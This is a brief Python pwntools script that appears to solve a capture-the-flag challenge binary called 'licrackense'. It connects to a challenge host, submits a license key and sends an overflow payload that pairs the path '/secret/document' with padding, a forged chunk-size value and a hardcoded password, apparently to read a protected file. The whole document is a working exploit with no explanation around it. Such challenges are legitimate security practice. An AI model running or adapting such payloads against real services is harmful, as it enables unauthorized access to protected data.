license = open("./license.txt", "rb").read()
password = b"\xd7\x89\x0e\x98vT5nx\x90\t\x87\xb6TVx"
from pwn import *
exe = './licrackense'
elf = context.binary = ELF(exe, checksec = 0)
# context.log_level = 'debug'
io = process(exe)
io=remote("192.168.0.52", 10044)

io.sendlineafter(b"License Key : ", license)

payload = b"/secret/document"
payload += p64(0) * 31
payload += p64(0x21)
payload += password

io.sendline(payload)

io.interactive()